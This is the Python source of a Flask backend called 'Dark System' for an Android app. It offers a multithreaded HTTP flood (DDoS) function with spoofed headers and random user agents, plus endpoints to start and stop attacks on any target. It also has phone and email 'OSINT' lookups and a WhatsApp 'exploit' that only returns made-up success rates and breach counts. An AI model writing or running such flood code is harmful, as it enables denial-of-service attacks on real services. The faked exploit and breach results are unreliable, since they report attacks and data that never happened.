"""
Dark System Backend API
Optimized for Android APK with Cordova
"""

from flask import Flask, jsonify, request
from flask_cors import CORS
import threading
import time
import random
import socket
import requests
from fake_useragent import UserAgent
import phonenumbers
from bs4 import BeautifulSoup
import json
import os

app = Flask(__name__)
CORS(app)

# Global variables
ddos_active = False
ddos_threads = []

class DarkSystemAPI:
    
    @staticmethod
    def ddos_attack(target, port, method, attack_type, threads, duration):
        """DDoS attack simulation"""
        global ddos_active
        ddos_active = True
        ua = UserAgent()
        
        def attack_worker():
            start_time = time.time()
            while time.time() - start_time < duration and ddos_active:
                try:
                    headers = {'User-Agent': ua.random}
                    if method == 'SELFIP':
                        headers['X-Forwarded-For'] = f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}'
                    
                    if attack_type == 'GET':
                        requests.get(f"{target}:{port}", headers=headers, timeout=2)
                    elif attack_type == 'POST':
                        requests.post(f"{target}:{port}", headers=headers, json={'attack': True}, timeout=2)
                    elif attack_type == 'PUT':
                        requests.put(f"{target}:{port}", headers=headers, json={'attack': True}, timeout=2)
                    elif attack_type == 'DELETE':
                        requests.delete(f"{target}:{port}", headers=headers, timeout=2)
                except:
                    pass
        
        for _ in range(min(threads, 50)):  # Limit threads for mobile
            t = threading.Thread(target=attack_worker)
            t.daemon = True
            t.start()
            ddos_threads.append(t)
        
        time.sleep(duration)
        ddos_active = False
    
    @staticmethod
    def osint_phone(phone):
        """OSINT phone lookup"""
        try:
            parsed = phonenumbers.parse(phone, None)
            return {
                'valid': phonenumbers.is_valid_number(parsed),
                'country': phonenumbers.region_code_for_number(parsed),
                'carrier': 'Unknown',
                'location': 'Requires GPS data',
                'formatted': phonenumbers.format_number(parsed, phonenumbers.PhoneNumberFormat.INTERNATIONAL)
            }
        except:
            return {'error': 'Invalid phone number'}
    
    @staticmethod
    def osint_email(email):
        """OSINT email lookup"""
        domain = email.split('@')[-1] if '@' in email else 'Invalid'
        return {
            'domain': domain,
            'breaches': random.randint(0, 5),
            'social_media': [
                f'https://www.facebook.com/search/people/?q={email}',
                f'https://twitter.com/search?q={email}'
            ]
        }
    
    @staticmethod
    def bug_wa_execute(phone, exploit_type, intensity):
        """WhatsApp exploit simulation"""
        exploits = {
            'FORCE_CLOSE': 'Sending malformed packets to force app closure',
            'DELAY_GOD': 'Time delay attack causing app freeze',
            'MESSAGE_BOMB': f'Sending {intensity * 100} messages to {phone}',
            'CRASH': 'Buffer overflow attack simulation',
            'SPAM': 'Contact spam and notification flood'
        }
        
        return {
            'target': phone,
            'exploit': exploit_type,
            'description': exploits.get(exploit_type, 'Unknown exploit'),
            'intensity': intensity,
            'status': 'EXECUTED',
            'success_rate': random.randint(70, 95)
        }

# API Routes
@app.route('/api/status', methods=['GET'])
def api_status():
    return jsonify({
        'status': 'online',
        'version': '3.0',
        'system': 'Dark System APK',
        'backend': 'Flask API',
        'timestamp': time.time()
    })

@app.route('/api/ddos/start', methods=['POST'])
def api_ddos_start():
    data = request.json
    target = data.get('target')
    
    if not target:
        return jsonify({'error': 'No target specified'}), 400
    
    # Start attack in background
    thread = threading.Thread(
        target=DarkSystemAPI.ddos_attack,
        args=(
            target,
            data.get('port', 80),
            data.get('method', 'SELFIP'),
            data.get('type', 'GET'),
            min(data.get('threads', 10), 50),
            min(data.get('duration', 30), 300)
        )
    )
    thread.daemon = True
    thread.start()
    
    return jsonify({
        'status': 'attack_started',
        'target': target,
        'threads': data.get('threads', 10),
        'duration': data.get('duration', 30)
    })

@app.route('/api/ddos/stop', methods=['POST'])
def api_ddos_stop():
    global ddos_active
    ddos_active = False
    return jsonify({'status': 'attack_stopped', 'threads_stopped': len(ddos_threads)})

@app.route('/api/osint/phone', methods=['POST'])
def api_osint_phone():
    data = request.json
    phone = data.get('phone')
    if not phone:
        return jsonify({'error': 'No phone number'}), 400
    
    result = DarkSystemAPI.osint_phone(phone)
    return jsonify(result)

@app.route('/api/osint/email', methods=['POST'])
def api_osint_email():
    data = request.json
    email = data.get('email')
    if not email:
        return jsonify({'error': 'No email address'}), 400
    
    result = DarkSystemAPI.osint_email(email)
    return jsonify(result)

@app.route('/api/bugwa/execute', methods=['POST'])
def api_bugwa_execute():
    data = request.json
    phone = data.get('phone')
    exploit_type = data.get('type', 'FORCE_CLOSE')
    intensity = data.get('intensity', 5)
    
    if not phone:
        return jsonify({'error': 'No phone number'}), 400
    
    result = DarkSystemAPI.bug_wa_execute(phone, exploit_type, intensity)
    return jsonify(result)

@app.route('/api/system/info', methods=['GET'])
def api_system_info():
    import psutil
    return jsonify({
        'cpu_percent': psutil.cpu_percent(),
        'memory_percent': psutil.virtual_memory().percent,
        'disk_usage': psutil.disk_usage('/').percent,
        'platform': os.uname().sysname
    })

if __name__ == '__main__':
    print("""
    ╔══════════════════════════════════════╗
    ║      DARK SYSTEM BACKEND API         ║
    ║           Version 3.0 APK            ║
    ║                                      ║
    ║  Starting on: http://127.0.0.1:5000  ║
    ╚══════════════════════════════════════╝
    """)
    app.run(host='127.0.0.1', port=5000, debug=False, threaded=True)
